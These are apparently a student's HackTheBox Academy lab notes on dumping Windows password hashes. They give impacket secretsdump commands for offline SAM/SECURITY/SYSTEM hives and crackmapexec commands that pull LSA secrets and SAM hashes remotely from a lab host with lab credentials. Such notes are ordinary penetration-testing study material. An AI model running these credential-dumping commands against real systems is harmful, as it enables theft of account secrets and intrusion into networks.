
![[Pasted image 20240911140023.png]]Dumping hashes with impacket
![[Pasted image 20240911220611.png]]
```shell-session
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL


impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

Dumping LSA Remotely 
![[Pasted image 20240911222543.png]]
```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
Dumping SAM Remotely
![[Pasted image 20240911222626.png]]
```shell-session
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
